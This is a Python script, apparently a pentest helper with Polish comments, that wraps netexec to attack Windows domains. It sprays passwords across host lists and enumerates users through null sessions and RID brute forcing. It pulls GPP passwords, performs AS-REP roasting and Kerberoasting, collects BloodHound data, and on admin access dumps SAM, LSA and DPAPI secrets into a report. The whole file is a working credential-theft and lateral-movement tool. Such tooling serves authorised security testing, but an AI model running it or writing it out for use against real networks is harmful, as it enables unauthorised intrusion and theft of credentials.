#!/usr/bin/env python3
"""nxsweep - wrapper na netexec: initial enum + macierz statusow per host/protokol.

  ./nxsweep.py -t 10.10.10.10 -u jdoe -p 'Passw0rd!' -d corp.local
  ./nxsweep.py -t hosts.txt -u users.txt -p passwords.txt -d corp.local   # spray
  ./nxsweep.py -t dc01.corp.local -u jdoe -H 31d6cfe0... --bh --loot
  ./nxsweep.py -t dc01.corp.local -u jdoe -p 'x' -d corp.local -k
  ./nxsweep.py -t 10.10.10.10 -u jdoe -p 'x' --dry-run
"""
import argparse
import os
import re
import signal
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

# ---------------------------------------------------------------- statusy
DOWN, OPEN, AUTH_FAIL, AUTH_OK, PWNED = "DOWN", "OPEN", "AUTH_FAIL", "AUTH_OK", "PWNED"
RANK = {DOWN: 0, OPEN: 1, AUTH_FAIL: 2, AUTH_OK: 3, PWNED: 4}
OFF, HDR, DIM = "\033[0m", "\033[1;36m", "\033[90m"
GREEN, RED, YELLOW, CYAN = "\033[1;32m", "\033[1;31m", "\033[33m", "\033[36m"
PAINT = {PWNED: RED, AUTH_OK: GREEN, AUTH_FAIL: YELLOW, OPEN: CYAN, DOWN: DIM}
USE_COLOR = True


def c(code, text):
    return f"{code}{text}{OFF}" if USE_COLOR else text


def paint_line(line):
    """[+] podswietlone, Pwn3d! na czerwono, porazki wyszarzone, reszta zwykla."""
    if "Pwn3d!" in line:
        return c(RED, line)
    if "[+]" in line:
        return c(GREEN, line)
    if "[-]" in line:
        return c(DIM, line)
    if "[!]" in line:
        return c(YELLOW, line)
    return line


def paint_report(txt):
    for st in (PWNED, AUTH_OK, AUTH_FAIL, OPEN, DOWN):
        txt = re.sub(rf"\b{st}\b", lambda m, s=st: c(PAINT[s], m.group()), txt)
    return txt

PROTOCOLS = ["smb", "ldap", "mssql", "winrm", "ssh", "rdp"]

ANSI = re.compile(r"\x1b\[[0-9;]*m")
# SMB   10.10.10.5   445   DC01   [+] corp.local\user:pass (Pwn3d!)
LINE = re.compile(
    r"^(?P<proto>[A-Z0-9]+)\s+(?P<host>\S+)\s+(?P<port>\d+)\s+(?P<name>\S+)\s+"
    r"\[(?P<mark>[-+*!])\]\s*(?P<msg>.*)$"
)
# ta sama linia ALE bez markera = wiersz z danymi (userzy, share'y, hashe)
# (name:DC01) (domain:corp.local) - stad bierzemy FQDN i domene
BANNER = re.compile(r"\(name:(?P<name>[^)]*)\)\s*\(domain:(?P<domain>[^)]*)\)")
IP_RE = re.compile(r"^\d{1,3}(\.\d{1,3}){3}$")

DATA_LINE = re.compile(r"^[A-Z0-9]+\s+\S+\s+\d+\s+\S+\s+(?P<msg>.+)$")


# ---------------------------------------------------------------- checki
@dataclass
class Check:
    id: str
    proto: str
    args: list = field(default_factory=list)
    when: str = "auth"      # always | auth | pwned | opt
    auth: str = "creds"     # creds | null | local
    label: str = ""


CHECKS = [
    # --- faza 1: probe (zawsze, buduje macierz statusow) ---
    *[Check(f"probe-{p}", p, [], when="always", label=f"probe {p.upper()}")
      for p in PROTOCOLS],
    Check("smb-null-users", "smb", ["--users"], when="always", auth="null",
          label="null session: userzy"),
    Check("mssql-local", "mssql", [], when="always", auth="local",
          label="MSSQL local-auth"),

    # --- faza 2: enum (tylko tam gdzie auth przeszedl) ---
    Check("smb-shares",   "smb", ["--shares"],              label="share'y"),
    Check("smb-rid",      "smb", ["--rid-brute", "10000"],  label="RID brute"),
    Check("smb-gpp-pass", "smb", ["-M", "gpp_password"],    label="GPP password"),
    Check("smb-gpp-auto", "smb", ["-M", "gpp_autologin"],   label="GPP autologin"),

    Check("ldap-asrep", "ldap", ["--asreproast", "{out}/asrep.hashes"], label="AS-REP roast"),
    Check("ldap-kerb",  "ldap", ["--kerberoasting", "{out}/kerb.hashes"], label="Kerberoast"),
    Check("ldap-desc",  "ldap", ["-M", "get-desc-users"],   label="opisy userow"),
    Check("ldap-adcs",  "ldap", ["-M", "adcs"],             label="ADCS"),

    # --- faza 3: loot (tylko przy Pwn3d!, flaga --loot) ---
    Check("loot-sam",   "smb", ["--sam"],   when="pwned", label="SAM"),
    Check("loot-lsa",   "smb", ["--lsa"],   when="pwned", label="LSA"),
    Check("loot-dpapi", "smb", ["--dpapi"], when="pwned", label="DPAPI"),

    # --- opcjonalne (wlaczane flaga) ---
    Check("ldap-bloodhound", "ldap",
          ["--bloodhound", "--collection", "All", "--dns-server", "{dc}"],
          when="opt", label="BloodHound"),
    Check("rdp-screenshot", "rdp", ["--screenshot"], when="opt", label="RDP screenshot"),
    Check("gen-hosts", "smb", ["--generate-hosts-file", "{out}/hosts"],
          when="opt", label="generuj /etc/hosts"),
]

OPTIONAL = {"ldap-bloodhound": "bh", "rdp-screenshot": "screenshot",
            "gen-hosts": "gen_hosts"}

# co wyciagnac do sekcji FINDINGS: check_id -> regex dopasowywany do linii
FINDINGS = {
    "smb-null-users": "DATA",
    "smb-shares":     "DATA",
    "smb-rid":        r"SidTypeUser",
    "smb-gpp-pass":   r"Found credentials|usernames:|passwords:|cpassword",
    "smb-gpp-auto":   r"Found credentials|usernames:|passwords:",
    "ldap-desc":      "DATA",
    "ldap-adcs":      "DATA",
    "loot-sam":       "DATA",
    "loot-lsa":       "DATA",
    "loot-dpapi":     "DATA",
}


# ---------------------------------------------------------------- args
def parse_args():
    p = argparse.ArgumentParser(description="netexec initial enum wrapper")
    p.add_argument("-t", "--target", required=True, help="IP / FQDN / CIDR / plik z hostami")
    p.add_argument("-u", "--user", default="", help="user albo plik z userami")
    p.add_argument("-p", "--password", default="", help="haslo albo plik z haslami")
    p.add_argument("-H", "--hash", default="", help="NT hash albo LM:NT")
    p.add_argument("-d", "--domain", default="")
    p.add_argument("--dc", default="", help="adres DC - checki LDAP leca tylko tu")
    p.add_argument("--dc-ip", default="", help="dns-server dla BloodHound (default: --dc)")
    p.add_argument("-k", "--kerberos", action="store_true", help="auth Kerberos")
    p.add_argument("--kcache", action="store_true", help="uzyj KRB5CCNAME (--use-kcache)")
    p.add_argument("--kdchost", default="", help="FQDN KDC")
    p.add_argument("--local", action="store_true", help="--local-auth dla wszystkiego")
    p.add_argument("-o", "--out", default="")
    p.add_argument("--bh", action="store_true", help="zbierz BloodHound")
    p.add_argument("--screenshot", action="store_true", help="RDP screenshot")
    p.add_argument("--loot", action="store_true", help="SAM/LSA/DPAPI przy Pwn3d!")
    p.add_argument("--skip", default="", help="pomin checki po id, po przecinku")
    p.add_argument("--timeout", type=int, default=300)
    p.add_argument("--nxc", default="nxc")
    p.add_argument("--gen-hosts", action="store_true",
                   help="nxc --generate-hosts-file (wpisy do /etc/hosts)")
    p.add_argument("--debug", action="store_true", help="nxc --debug")
    p.add_argument("--verbose", action="store_true", help="nxc --verbose")
    p.add_argument("--nxc-timeout", type=int, default=30, help="nxc --timeout (na watek)")
    p.add_argument("--threads", type=int, default=0, help="nxc --threads")
    p.add_argument("--jitter", default="", help="nxc --jitter")
    p.add_argument("--dns-server", default="", help="nxc --dns-server")
    p.add_argument("--dns-timeout", type=int, default=0, help="nxc --dns-timeout")
    p.add_argument("--no-color", action="store_true")
    p.add_argument("--dry-run", action="store_true", help="tylko wypisz komendy")
    return p.parse_args()


def nxc_globals(a):
    """Flagi nxc doklejane do kazdej komendy."""
    g = ["--no-progress"]                      # pasek postepu smieci w logach
    if a.debug:
        g.append("--debug")
    elif a.verbose:
        g.append("--verbose")
    if a.nxc_timeout:
        g += ["--timeout", str(a.nxc_timeout)]  # max czas na watek
    if a.threads:
        g += ["--threads", str(a.threads)]
    if a.jitter:
        g += ["--jitter", str(a.jitter)]
    if a.dns_server:
        g += ["--dns-server", a.dns_server]
    if a.dns_timeout:
        g += ["--dns-timeout", str(a.dns_timeout)]
    return g


def is_list(value):
    return bool(value) and Path(value).is_file()


def build_auth(a, mode):
    """Jedno miejsce budujace auth - wszystkie checki z tego korzystaja."""
    if mode == "null":
        return ["-u", "", "-p", ""]

    args = ["-u", a.user]
    args += ["-H", a.hash] if a.hash else ["-p", a.password]
    if a.domain:
        args += ["-d", a.domain]
    if a.kerberos:
        args.append("-k")
    if a.kcache:
        args.append("--use-kcache")
    if a.kdchost:
        args += ["--kdcHost", a.kdchost]
    if a.local or mode == "local":
        args.append("--local-auth")
    # przy listach nxc domyslnie przerywa po pierwszym trafieniu
    if is_list(a.user) or is_list(a.password):
        args.append("--continue-on-success")
    return args


def is_range(t):
    """Czy cel to zasieg/lista, a nie pojedynczy host."""
    return "/" in t or "-" in t.split(".")[-1] or Path(t).is_file()


def skip_reason(a, chk):
    """LDAP na cala podsiec = pewne zawieszenie. Wymagamy --dc."""
    if chk.proto == "ldap" and not a.dc and is_range(a.target):
        return "cel to zasieg - wskaz DC przez --dc, inaczej LDAP wisi na 256 hostach"
    return None


def preflight(a):
    """Kombinacje, ktore ciche nie zadzialaja - lepiej wiedziec przed skanem."""
    w = []
    bare = a.target.split("/")[0]
    if a.kerberos or a.kcache:
        if IP_RE.match(bare) and not a.dc:
            w.append("Kerberos po IP nie zadziala - SPN buduje sie z nazwy. "
                     "Daj --dc dc01.corp.local i wpis w /etc/hosts")
        if not a.kdchost:
            w.append("Kerberos bez --kdchost: nxc szuka KDC przez DNS, latwo o timeout")
        if not a.domain:
            w.append("Kerberos bez -d: realm nie bedzie znany")
    if a.domain and a.local:
        w.append("-d i --local sie wykluczaja w nxc, zostaw jedno")
    if a.bh and not a.dns_server:
        w.append("--bh bez --dns-server: BloodHound nie rozwiaze hostow domenowych "
                 "(daj --dns-server <IP DC>)")
    if a.dc and IP_RE.match(a.dc) and (a.kerberos or a.kcache):
        w.append("--dc po IP przy Kerberosie - powinien byc FQDN")
    return w


def adopt_banner(a, text):
    """Z bannerow SMB dociaga domene i FQDN - ale tylko gdy domena jest JEDNA."""
    found = {}
    for m in BANNER.finditer(text):
        found.setdefault(m.group("domain"), m.group("name"))

    if len(found) > 1:
        print(c(YELLOW, f"  [!] {len(found)} roznych domen w zasiegu: "
                        f"{', '.join(sorted(found))}"))
        print(c(YELLOW, "      nie ustawiam -d ani --dc automatycznie - wybierz cel sam"))
        return
    if not found:
        return

    dom, name = next(iter(found.items()))
    fqdn = f"{name}.{dom}" if "." in dom else name
    if not a.domain and not a.local and "." in dom:
        a.domain = dom
        print(c(CYAN, f"  [i] wykryta domena: {dom}"))
    if not a.dc and (a.kerberos or a.kcache) and "." in dom:
        a.dc = fqdn
        print(c(CYAN, f"  [i] LDAP/Kerberos kieruje na {fqdn} "
                      f"(dodaj do /etc/hosts: {a.target} {fqdn} {name})"))
    if not a.dns_server and a.bh and IP_RE.match(a.target):
        a.dns_server = a.target
        print(c(CYAN, f"  [i] --dns-server ustawiony na {a.target}"))


def suggest_next(a, matrix):
    """Po sweepie: pokaz gdzie creds weszly i podaj gotowa komende."""
    wins = sorted({h for (h, pr), st in matrix.items()
                   if pr == "smb" and st in (AUTH_OK, PWNED)})
    if not wins or not is_range(a.target):
        return
    print(c(GREEN, f"\n[+] creds dzialaja na: {', '.join(wins)}"))
    print(c(DIM, f"    dalej: {sys.argv[0]} -t {','.join(wins)} "
                 f"-u {a.user} -p '<haslo>' --dc <IP DC>\n"))


# ---------------------------------------------------------------- runner
def run(a, outdir, chk, results, meta):
    fmt = {"out": str(outdir), "dc": a.dc_ip}
    target = a.dc if (chk.proto == "ldap" and a.dc) else a.target
    cmd = [a.nxc, chk.proto, target] + build_auth(a, chk.auth) + \
          [x.format(**fmt) for x in chk.args] + nxc_globals(a)

    if a.dry_run:
        print(" ".join(cmd))
        results[chk.id] = ""
        return ""

    print(f"{HDR}[*] {chk.label or chk.id}{OFF}")
    t0 = time.monotonic()
    lines, killed = [], False

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, text=True, bufsize=1,
                                start_new_session=True)   # wlasna grupa procesow
    except FileNotFoundError:
        sys.exit(f"nie znalazlem '{a.nxc}' w PATH")

    def kill():
        """Zabija cala grupe - inaczej dzieci nxc trzymaja pipe i czytanie wisi."""
        nonlocal killed
        killed = True
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except ProcessLookupError:
            pass

    # watchdog: dziala nawet gdy nxc wisi nie wypisujac nic
    timer = threading.Timer(a.timeout, kill)
    timer.start()

    done, last_out = threading.Event(), [time.monotonic()]

    def heartbeat():
        """Zeby nie wygladalo na zawieszone, gdy nxc dlugo milczy."""
        while not done.wait(15):
            quiet = time.monotonic() - last_out[0]
            if quiet >= 15:
                print(c(DIM, f"  ... cisza od {quiet:.0f}s, "
                             f"lacznie {time.monotonic() - t0:.0f}s "
                             f"z limitu {a.timeout}s"))

    hb = threading.Thread(target=heartbeat, daemon=True)
    hb.start()
    try:
        for line in proc.stdout:                 # czytamy na biezaco
            line = ANSI.sub("", line.rstrip())
            lines.append(line)
            last_out[0] = time.monotonic()
            print(paint_line(line))
    finally:
        done.set()
        timer.cancel()
        proc.wait()

    elapsed = time.monotonic() - t0
    out = "\n".join(lines)

    if killed:
        last = lines[-1] if lines else "(nic nie zdazylo wyjsc)"
        print(c(YELLOW, f"  [!] TIMEOUT po {elapsed:.0f}s, ostatnia linia: {last}"))
        out += f"\n[!] ZABITE PO TIMEOUCIE {elapsed:.0f}s"
    elif not lines:
        print(c(DIM, "  (brak odpowiedzi)"))

    print(c(DIM, f"  ({elapsed:.1f}s)"))
    meta[chk.id] = {"elapsed": elapsed, "timeout": killed,
                    "last": lines[-1] if lines else "", "cmd": " ".join(cmd)}
    (outdir / f"{chk.id}.log").write_text(f"# $ {' '.join(cmd)}\n# {elapsed:.1f}s\n\n{out}\n")
    results[chk.id] = out
    return out


# ---------------------------------------------------------------- parsowanie
def parse_lines(text):
    rows = []
    for line in ANSI.sub("", text).splitlines():
        m = LINE.match(line.strip())
        if m:
            rows.append(m.groupdict())
    return rows


def classify(row):
    if row["mark"] == "+":
        return PWNED if "Pwn3d!" in row["msg"] else AUTH_OK
    if row["mark"] == "-":
        return AUTH_FAIL
    return OPEN          # [*] / [!] = port odpowiada, ale bez auth


def update_matrix(matrix, text):
    """matrix[(host, proto)] = najwyzszy zaobserwowany status"""
    for row in parse_lines(text):
        key = (row["host"], row["proto"].lower())
        new = classify(row)
        if RANK[new] > RANK.get(matrix.get(key, DOWN), 0):
            matrix[key] = new


def status_of(matrix, proto):
    best = DOWN
    for (host, pr), st in matrix.items():
        if pr == proto and RANK[st] > RANK[best]:
            best = st
    return best


# ---------------------------------------------------------------- raport
def report(a, outdir, matrix, results, meta):
    out = [f"=== nxsweep {a.target} ({datetime.now():%Y-%m-%d %H:%M}) ===", ""]

    hosts = sorted({h for (h, _) in matrix})
    out.append("--- MACIERZ STATUSOW ---")
    out.append(f"{'HOST':<22}" + "".join(f"{p.upper():<11}" for p in PROTOCOLS))
    for h in hosts:
        out.append(f"{h:<22}" + "".join(
            f"{matrix.get((h, p), DOWN):<11}" for p in PROTOCOLS))
    out += ["",
            "DOWN=brak odpowiedzi  OPEN=port otwarty, auth nieudany/niepodjety",
            "AUTH_FAIL=creds odrzucone  AUTH_OK=logowanie dziala  PWNED=admin",
            ""]

    out.append("--- FINDINGS ---")
    found = False
    for cid, pattern in FINDINGS.items():
        text = results.get(cid, "")
        if not text:
            continue
        if pattern == "DATA":
            hits = [m.group("msg").strip() for l in (x.strip() for x in text.splitlines())
                    if not LINE.match(l) and (m := DATA_LINE.match(l))]
        else:
            hits = [l.strip() for l in text.splitlines() if re.search(pattern, l, re.I)]
        hits = list(dict.fromkeys(hits))
        if hits:
            found = True
            out.append(f"[{cid}]")
            out += [f"  {h}" for h in hits[:40]]
            out.append("")
    if not found:
        out.append("(nic)\n")

    timeouts = [(k, m) for k, m in meta.items() if m["timeout"]]
    if timeouts:
        out.append("--- TIMEOUTY ---")
        for k, m in timeouts:
            out.append(f"  {k}  ({m['elapsed']:.0f}s)")
            out.append(f"    ostatnia linia: {m['last'] or '(brak outputu)'}")
            out.append(f"    powtorz: {m['cmd']} --debug")
        out.append("")

    slow = sorted(meta.items(), key=lambda kv: -kv[1]["elapsed"])[:5]
    if slow:
        out.append("--- NAJWOLNIEJSZE ---")
        out += [f"  {k:<18} {m['elapsed']:6.1f}s" for k, m in slow]
        out.append("")

    out.append("--- HASHE ---")
    any_hash = False
    for f in ("kerb.hashes", "asrep.hashes"):
        pth = outdir / f
        if pth.exists() and pth.stat().st_size:
            any_hash = True
            out.append(f"  {pth}: {len(pth.read_text().splitlines())} szt.")
    if not any_hash:
        out.append("  (brak)")
    out.append("")

    if any("STATUS_ACCOUNT_LOCKED_OUT" in t for t in results.values()):
        out.append("!!! LOCKOUT WYKRYTY - przerwij spray !!!\n")

    txt = "\n".join(out)
    (outdir / "REPORT.txt").write_text(txt)
    return txt


# ---------------------------------------------------------------- main
def main():
    global USE_COLOR
    a = parse_args()
    USE_COLOR = (not a.no_color and sys.stdout.isatty()
                 and not os.environ.get("NO_COLOR"))
    if not a.dc_ip:
        a.dc_ip = a.dc or a.target
    if a.kcache and not os.environ.get("KRB5CCNAME"):
        print("[!] --kcache a KRB5CCNAME nie ustawione")

    stem = Path(a.target).name.replace("/", "_")
    outdir = Path(a.out or f"nxsweep-{stem}-{datetime.now():%Y%m%d-%H%M%S}")
    outdir.mkdir(parents=True, exist_ok=True)
    skip = {s.strip() for s in a.skip.split(",") if s.strip()}

    results, matrix, meta = {}, {}, {}
    have_creds = bool(a.user)

    print(f"target : {a.target}\nuser   : {a.user or '<brak>'}\n"
          f"auth   : {'hash' if a.hash else 'kerberos' if a.kerberos else 'haslo'}\n"
          f"out    : {outdir}\n")

    for wmsg in preflight(a):
        print(c(YELLOW, f"[!] {wmsg}"))
    print()

    # faza 1 - probe
    for chk in [c for c in CHECKS if c.when == "always"]:
        if chk.id in skip or (chk.auth != "null" and not have_creds):
            continue
        if (why := skip_reason(a, chk)):
            print(c(YELLOW, f"[!] pomijam {chk.id}: {why}"))
            continue
        out = run(a, outdir, chk, results, meta)
        update_matrix(matrix, out)
        if chk.id == "probe-smb":
            adopt_banner(a, out)      # domena/FQDN znane dopiero po tym probie

    # faza 2 - enum tylko tam gdzie auth dziala
    if have_creds:
        for chk in [c for c in CHECKS if c.when == "auth"]:
            if chk.id in skip:
                continue
            if (why := skip_reason(a, chk)):
                print(c(YELLOW, f"[!] pomijam {chk.id}: {why}"))
                continue
            st = status_of(matrix, chk.proto)
            if not a.dry_run and RANK[st] < RANK[AUTH_OK]:
                print(f"{DIM}[-] pomijam {chk.id}: {chk.proto.upper()}={st}{OFF}")
                continue
            update_matrix(matrix, run(a, outdir, chk, results, meta))

    # faza 3 - loot
    if a.loot and (a.dry_run or status_of(matrix, "smb") == PWNED):
        for chk in [c for c in CHECKS if c.when == "pwned"]:
            if chk.id not in skip:
                update_matrix(matrix, run(a, outdir, chk, results, meta))

    # opcjonalne
    for chk in [c for c in CHECKS if c.when == "opt"]:
        if chk.id in skip or not getattr(a, OPTIONAL[chk.id]):
            continue
        update_matrix(matrix, run(a, outdir, chk, results, meta))

    if a.dry_run:
        return
    suggest_next(a, matrix)
    print("\n" + paint_report(report(a, outdir, matrix, results, meta)))
    print(f"logi -> {outdir}")


if __name__ == "__main__":
    main()
